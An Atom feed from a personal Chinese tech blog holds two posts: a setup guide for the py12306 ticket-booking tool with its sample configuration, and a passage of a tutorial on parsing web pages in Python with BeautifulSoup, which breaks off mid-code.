<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Aaron Li</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="muzimz.cn/"/>
  <updated>2019-02-17T12:23:19.820Z</updated>
  <id>muzimz.cn/</id>
  
  <author>
    <name>Aaron Li</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>12306自动化抢票</title>
    <link href="muzimz.cn/2019/02/13/12306%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8A%A2%E7%A5%A8/"/>
    <id>muzimz.cn/2019/02/13/12306自动化抢票/</id>
    <published>2019-02-13T01:56:43.000Z</published>
    <updated>2019-02-17T12:23:19.820Z</updated>
    
    <content type="html"><![CDATA[<h2 id="瞎扯"><a href="#瞎扯" class="headerlink" title="瞎扯"></a>瞎扯</h2><p>不知不觉，这年也算是过完了。</p><p>于我而言，现在的春节似乎已经没有了幼时所应该感受到的乐趣。蓦然回首，往事历历在目，仍记得幼时的伙伴常常聚在一起玩卡牌、捡鞭炮、拜年….如今，这一切的一切都已成浮云，或许是因为我们感受到了生活、学习等带来的压力，在压力袭来的同时我们一步步的成长着，现在的我们必须学会某些事、承担某些事，所以幼时的无忧无虑现在是那么的奢侈。</p><p><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=567216776,4167239058&fm=26&gp=0.jpg"></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>春节之后，大多数亲戚朋友都需要为了生活而奔波而远离家乡，前段时间有亲戚因购买不到南昌-深圳的车票而焦灼着。众所周知，12306的防爬措施是做的很极致的，曾经自己也尝试着使用python来写一个12306的抢票程序，耐于目前自己的能力以及时间受限，在验证过程中始终通过不了，而自己又没有足够的经济条件来使用打码平台，所以就尝试去github上搜索下相关12306抢票项目。果不其然，在github上就有这么一款12306抢票神器，使用之后然我欲罢不能，经过四天的努力终于帮亲戚抢到了3张南昌-深圳的车票。</p><p>前人栽树，后人乘凉。基于该神器的强大，所以想通过该文章记录一下使用方式，也方便后来者的较快的了解该项目，项目github仓库：<a href="https://github.com/pjialin/py12306" target="_blank" rel="noopener">https://github.com/pjialin/py12306</a>，在此，也感谢作者的用心良苦，希望这个工具能够帮助到大家。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>该项目需要在python3.6以上版本才能使用，操作系统windowns、linux、mac（亲测有效）都可以，这里我们使用windows为例。</p><ul><li>首先，我们需要前往github仓库下载下载该12306抢票项目（py12306），git的下载在这里就不再说明了，不清楚的可以跳至：<a href="https://jacklxj.github.io/2018/09/10/Hexo-Github%E5%BB%BA%E7%AB%99/" target="_blank" rel="noopener">Git安装</a>，安装好后我们通过如下命令来进行下载：</li></ul><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/pjialin/py12306</span><br></pre></td></tr></table></figure><ul><li>在安装好python3.6以上版本之后，我们还需要安装其他支持工具，这里python建议下载Anaconda，下载及安装操作见：<a href="https://jacklxj.github.io/2018/09/23/Xshell远程连接linux并远程访问ipython服务/" target="_blank" rel="noopener">Anaconda下载及安装</a>，python安装好后，我们在终端执行如下命令来下载支持工具：</li></ul><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install redis==<span class="number">3.0</span><span class="number">.1</span></span><br><span class="line">pip install Flask-JWT-Extended==<span class="number">3.15</span><span class="number">.0</span></span><br><span class="line">pip install requests-html==<span class="number">0.9</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><ul><li><p>随后，我们复制<code>/py12306/env.py.example</code>文件并将复制后的文件命名为<code>env.py</code>。</p></li><li><p>打开浏览器使用目标12306账号登录12306官网并添加抢票乘客（可多个，注意将身份证等信息填写正确，学生需要额外填写相关信息）。</p></li><li><p>使用sublime编辑器（亦或其他）打开上述复制的<code>env.py</code>文件，并将12306账号、车次、时间等信息配置完成，主要配置说明如下：</p></li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"># 设置一：<span class="number">12306</span>抢票账号</span><br><span class="line">USER_ACCOUNTS = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">'key'</span>: <span class="number">0</span>,  # <span class="number">12306</span>账号id1，用于区分不同抢票账号</span><br><span class="line">        <span class="string">'user_name'</span>: [username1],   # <span class="number">12306</span>账号用户名<span class="number">1</span></span><br><span class="line">        <span class="string">'password'</span>: [password1],   # <span class="number">12306</span>账号用户密码<span class="number">1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    # &#123;</span><br><span class="line">    #     <span class="string">'key'</span>: <span class="number">2</span>,  # <span class="number">12306</span>账号id2</span><br><span class="line">    #     <span class="string">'user_name'</span>: [username2],     # 用户<span class="number">2</span></span><br><span class="line">    #     <span class="string">'password'</span>: [password2],    # 密码<span class="number">2</span></span><br><span class="line">    # &#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 设置二： 打码平台，用于验证码识别</span><br><span class="line"># 打码平台账号</span><br><span class="line"># 目前只支持免费打码接口 和 若快打码，注册地址：http:<span class="comment">//www.ruokuai.com/login</span></span><br><span class="line">AUTO_CODE_PLATFORM = <span class="string">'free'</span>  # 免费填写 free 若快 ruokuai  # 免费打码无法保证持续可用，如失效请手动切换</span><br><span class="line">AUTO_CODE_ACCOUNT = &#123;  # 使用 free 可用省略</span><br><span class="line">    <span class="string">'user'</span>: <span class="string">'your user name'</span>,</span><br><span class="line">    <span class="string">'pwd'</span>: <span class="string">'your password'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 设置三：邮箱配置，用于抢票成功通知</span><br><span class="line">EMAIL_ENABLED = <span class="number">1</span>  # 是否开启邮件通知</span><br><span class="line">EMAIL_SENDER = <span class="string">'XXX@qq.com'</span>  # 邮件发送者</span><br><span class="line">EMAIL_RECEIVER = [<span class="string">'XXX1@qq.com'</span>, <span class="string">'XXX2@qq.com'</span>]  # 邮件接受者，可以多个 </span><br><span class="line">EMAIL_SERVER_HOST = <span class="string">'smtp.qq.com'</span>  # 邮件服务 host</span><br><span class="line">EMAIL_SERVER_USER = <span class="string">'XXX@qq.com'</span>  # 邮件服务登录用户名，我在抢票的时候使用的是qq邮件服务，自行前往qq邮箱进行设置</span><br><span class="line">EMAIL_SERVER_PASSWORD = <span class="string">'password'</span>  # 邮件服务登录密码，qq邮箱设置完成之后会有一个密码，于此处填写即可</span><br><span class="line"></span><br><span class="line"># 设置四： web管理（flask）</span><br><span class="line">WEB_ENABLE = <span class="number">1</span>  # 是否打开 Web 管理</span><br><span class="line">WEB_USER = &#123;  # 登录信息</span><br><span class="line">    <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'password'</span>: <span class="string">'password'</span></span><br><span class="line">&#125;</span><br><span class="line">WEB_PORT = <span class="number">8008</span>  # 监听端口</span><br><span class="line"># 设置完成并程序运行之后，请求http:<span class="comment">//localhost:8008登录进行管理</span></span><br><span class="line"></span><br><span class="line"># 设置五：乘客信息设置</span><br><span class="line">QUERY_JOBS = [</span><br><span class="line">    &#123;</span><br><span class="line">        # <span class="string">'job_name'</span>:  <span class="string">'bj -&gt; sz'</span>,  # 任务名称，不填默认会以车站名命名，不可重复</span><br><span class="line">        <span class="string">'account_key'</span>: <span class="number">0</span>,  # 将会使用指定账号下单，于之前的<span class="number">12306</span>账号id对应</span><br><span class="line">        <span class="string">'left_dates'</span>: [  # 出发日期 :Array，可多选，按照自己的行程排序</span><br><span class="line">            <span class="string">"2019-02-16"</span>,</span><br><span class="line">            <span class="string">"2019-02-17"</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'stations'</span>: &#123;  # 车站 支持多个车站同时查询  :Dict or :List</span><br><span class="line">            <span class="string">'left'</span>: <span class="string">'亳州'</span>,     # 始发地</span><br><span class="line">            <span class="string">'arrive'</span>: <span class="string">'北京西'</span>,     # 目的地</span><br><span class="line">        &#125;,</span><br><span class="line">        #  # 多个车站示例  (建议添加多个，有时多买几站成功率会高一点)</span><br><span class="line">        # <span class="string">'stations'</span>: [&#123;</span><br><span class="line">        #     <span class="string">'left'</span>: <span class="string">'北京'</span>,</span><br><span class="line">        #     <span class="string">'arrive'</span>: <span class="string">'深圳'</span>,</span><br><span class="line">        # &#125;,&#123;  # 多个车站示例</span><br><span class="line">        #     <span class="string">'left'</span>: <span class="string">'北京'</span>,</span><br><span class="line">        #     <span class="string">'arrive'</span>: <span class="string">'广州'</span>,</span><br><span class="line">        # &#125;],</span><br><span class="line">        <span class="string">'members'</span>: [ </span><br><span class="line">            <span class="string">"张三"</span>,     # 乘客姓名，于之前<span class="number">12306</span>账号添加的乘客一致，可自动识别乘客类别</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'allow_less_member'</span>: <span class="number">0</span>,  # 是否允许余票不足时提交部分乘客</span><br><span class="line">        <span class="string">'seats'</span>: [  # 筛选座位，可多选，根据自己的倾向进行排序</span><br><span class="line">            # 可用值: 特等座, 商务座, 一等座, 二等座, 软卧, 硬卧, 动卧, 软座, 硬座, 无座</span><br><span class="line">            <span class="string">'硬卧'</span>,</span><br><span class="line">            # <span class="string">'软卧'</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'train_numbers'</span>: [  # 筛选车次 可以为空，为空则所有车次都可以提交 如 [] 注意大小写需要保持一致</span><br><span class="line">            <span class="string">"K148"</span>,</span><br><span class="line">            # <span class="string">"K1172"</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'except_train_numbers'</span>: [  # 筛选车次，排除车次  train_numbers 和 except_train_numbers 不可同时存在</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">'period'</span>: &#123;  # 筛选时间</span><br><span class="line">            <span class="string">'from'</span>: <span class="string">'00:00'</span>,</span><br><span class="line">            <span class="string">'to'</span>: <span class="string">'24:00'</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">   </span><br><span class="line">   # 如若有其他<span class="number">12306</span>账号进行抢票，可在此列表中进行添加，添加内容同上</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li>于此，该项目的设置基本完成，之后我们运行<code>main.py</code>主程序即可，命令如下：</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> ./py12306 $$ <span class="keyword">python</span> main.<span class="keyword">py</span></span><br></pre></td></tr></table></figure><p>运行结果示例如下：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/024f78f0f736afc36188d855bd19ebc4b745127d.jpg" width="500"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>以上内容仅为该项目的部分功能，如若像了解该项目更多信息，可前往项目地址:<a href="https://github.com/pjialin/py12306" target="_blank" rel="noopener">py12306</a></p><p>py12306交流群：<a href="http://shang.qq.com/wpa/qunwpa?idkey=8eab0b6402096266a62263c1cd452149926adb5cba7a2b7a98a5adc65869addf" target="_blank" rel="noopener">274781597</a></p><p>最后，感谢作者的用心良苦，希望这个工具能够帮助到大家。</p><p><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=214493079,1571383568&fm=26&gp=0.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;瞎扯&quot;&gt;&lt;a href=&quot;#瞎扯&quot; class=&quot;headerlink&quot; title=&quot;瞎扯&quot;&gt;&lt;/a&gt;瞎扯&lt;/h2&gt;&lt;p&gt;不知不觉，这年也算是过完了。&lt;/p&gt;
&lt;p&gt;于我而言，现在的春节似乎已经没有了幼时所应该感受到的乐趣。蓦然回首，往事历历在目，仍记得幼时的伙
      
    
    </summary>
    
      <category term="爬虫" scheme="muzimz.cn/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="muzimz.cn/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="12306" scheme="muzimz.cn/tags/12306/"/>
    
  </entry>
  
  <entry>
    <title>网页爬虫之页面解析</title>
    <link href="muzimz.cn/2019/01/01/%E7%BD%91%E9%A1%B5%E7%88%AC%E8%99%AB%E4%B9%8B%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90/"/>
    <id>muzimz.cn/2019/01/01/网页爬虫之页面解析/</id>
    <published>2018-12-31T16:18:51.000Z</published>
    <updated>2019-02-02T16:36:09.644Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>With the rapid development of the Internet，越来越多的信息充斥着各大网络平台。正如<a href="https://baike.baidu.com/item/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0/25476?fr=aladdin" target="_blank" rel="noopener">《死亡笔记》</a>中L·Lawliet这一角色所提到的<a href="https://baike.baidu.com/item/大数定律/410082?fr=aladdin" target="_blank" rel="noopener">大数定律</a>，在众多繁杂的数据中必然存在着某种规律，偶然中必然包含着某种必然的发生。不管是我们提到的大数定律，还是最近火热的大数据亦或其他领域都离不开大量而又干净数据的支持，为此，网络爬虫能够满足我们的需求，即在互联网上按照我们的意愿来爬取我们任何想要得到的信息，以便我们分析出其中的必然规律，进而做出正确的决策。同样，在我们平时上网的过程中，无时无刻可见爬虫的影子，比如我们广为熟知的“度娘”就是其中一个大型而又名副其实的“蜘蛛王”（SPIDER KING）。而要想写出一个强大的爬虫程序，则离不开熟练的对各种网络页面的解析，这篇文章将给读者介绍如何在Python中使用各大解析工具。</p><h2 id="内容扼要"><a href="#内容扼要" class="headerlink" title="内容扼要"></a>内容扼要</h2><p>常用的解析方式主要有正则、Beautiful Soup、XPath、pyquery，本文主要是讲解后三种工具的使用，而对正则表达式的使用不做讲解，对正则有兴趣了解的读者可以跳转：<a href="https://baike.baidu.com/item/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/1700215?fr=aladdin" target="_blank" rel="noopener">正则表达式</a></p><ul><li><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#contents-children" target="_blank" rel="noopener">Beautiful Soup</a>的使用</li><li><a href="https://www.w3.org/TR/xpath/all/" target="_blank" rel="noopener">XPath</a>的使用</li><li><a href="https://pythonhosted.org/pyquery/" target="_blank" rel="noopener">pyquery</a>的使用</li><li>Beautiful Soup、XPath、pyquery解析<a href="https://hr.tencent.com/" target="_blank" rel="noopener">腾讯招聘网</a>案例</li></ul><h2 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h2><p>Beautiful Soup是Python爬虫中针对HTML、XML的其中一个解析工具，熟练的使用之可以很方便的提取页面中我们想要的数据。此外，在Beautiful Soup中，为我们提供了以下四种解析器：</p><ul><li>标准库，<code>soup = BeautifulSoup(content, &quot;html.parser&quot;)</code></li><li>lxml解析器，<code>soup = BeautifulSoup(content, &quot;lxml&quot;)</code></li><li>xml解析器，<code>soup = BeautifulSoup(content, &quot;xml&quot;)</code></li><li>html5lib解析器，<code>soup = BeautifulSoup(content, &quot;html5lib&quot;)</code></li></ul><p>在以上四种解析库中，lxml解析具有解析速度快兼容错能力强的merits，所以本文主要使用的是lxml解析器，下面我们主要拿百度首页的html来具体讲解下Beautiful Soup的使用：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from bs4 <span class="built_in">import</span> BeautifulSoup</span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="attr">response</span> = requests.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">    <span class="attr">encoding</span> = response.apparent_encoding</span><br><span class="line">    response.<span class="attr">encoding</span> = encoding</span><br><span class="line">    print(BeautifulSoup(response.text, <span class="string">"lxml"</span>))</span><br></pre></td></tr></table></figure><p>代码解读：</p><ul><li><code>response = requests.get(&quot;https://www.baidu.com&quot;)</code>，requests请求百度链接</li><li><code>encoding = response.apparent_encoding</code>，获取页面编码格式</li><li><code>response.encoding = encoding</code>，修改请求编码为页面对应的编码格式，以避免乱码</li><li><code>print(BeautifulSoup(response.text, &quot;lxml&quot;))</code>，使用lxml解析器来对百度首页html进行解析并打印结果</li></ul><p>打印后的结果如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span>/&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"IE=Edge"</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span>/&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"always"</span> <span class="attr">name</span>=<span class="string">"referrer"</span>/&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/bdorz/baidu.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>/&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">body</span> <span class="attr">link</span>=<span class="string">"#0000cc"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"wrapper"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"head"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"head_wrapper"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"s_form"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"s_form_wrapper"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"lg"</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">height</span>=<span class="string">"129"</span> <span class="attr">hidefocus</span>=<span class="string">"true"</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> <span class="attr">width</span>=<span class="string">"270"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"//www.baidu.com/s"</span> <span class="attr">class</span>=<span class="string">"fm"</span> <span class="attr">id</span>=<span class="string">"form"</span> <span class="attr">name</span>=<span class="string">"f"</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"bdorz_come"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"ie"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"utf-8"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"f"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"8"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"rsv_bp"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"rsv_idx"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"tn"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"baidu"</span>/&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bg s_ipt_wr"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span> <span class="attr">autofocus</span>=<span class="string">"autofocus"</span> <span class="attr">class</span>=<span class="string">"s_ipt"</span> <span class="attr">id</span>=<span class="string">"kw"</span> <span class="attr">maxlength</span>=<span class="string">"255"</span> <span class="attr">name</span>=<span class="string">"wd"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bg s_btn_wr"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"bg s_btn"</span> <span class="attr">id</span>=<span class="string">"su"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"百度一下"</span>/&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">form</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"u1"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://news.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trnews"</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"https://www.hao123.com"</span> <span class="attr">name</span>=<span class="string">"tj_trhao123"</span>&gt;</span>hao123<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://map.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trmap"</span>&gt;</span>地图<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://v.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trvideo"</span>&gt;</span>视频<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://tieba.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trtieba"</span>&gt;</span>贴吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">noscript</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"lb"</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com/bdorz/login.gif?login&amp;amp;tpl=mn&amp;amp;u=http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1"</span> <span class="attr">name</span>=<span class="string">"tj_login"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'&lt;a href="http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u='</span>+ <span class="built_in">encodeURIComponent</span>(<span class="built_in">window</span>.location.href+ (<span class="built_in">window</span>.location.search === <span class="string">""</span> ? <span class="string">"?"</span> : <span class="string">"&amp;"</span>)+ <span class="string">"bdorz_come=1"</span>)+ <span class="string">'" name="tj_login" class="lb"&gt;登录&lt;/a&gt;'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">                </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"bri"</span> <span class="attr">href</span>=<span class="string">"//www.baidu.com/more/"</span> <span class="attr">name</span>=<span class="string">"tj_briicon"</span> <span class="attr">style</span>=<span class="string">"display: block;"</span>&gt;</span>更多产品<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ftCon"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ftConw"</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"lh"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://home.baidu.com"</span>&gt;</span>关于百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://ir.baidu.com"</span>&gt;</span>About Baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"cp"</span>&gt;</span>©2017 Baidu <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com/duty/"</span>&gt;</span>使用百度前必读<span class="tag">&lt;/<span class="name">a</span>&gt;</span>  <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"cp-feedback"</span> <span class="attr">href</span>=<span class="string">"http://jianyi.baidu.com/"</span>&gt;</span>意见反馈<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 京ICP证030173号  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/img/gs.gif"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从上述代码中，我们可以看见打印出的内容有点过于杂乱无章，为了使得解析后的页面清洗直观，我们可以使用<code>prettify()</code>方法来对其进行标准的缩进操作，为了方便讲解，博主对结果进行适当的删除，只留下有价值的内容，源码及输出如下：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bd_soup = BeautifulSoup(<span class="name">response</span>.text, <span class="string">"lxml"</span>)</span><br><span class="line">print(<span 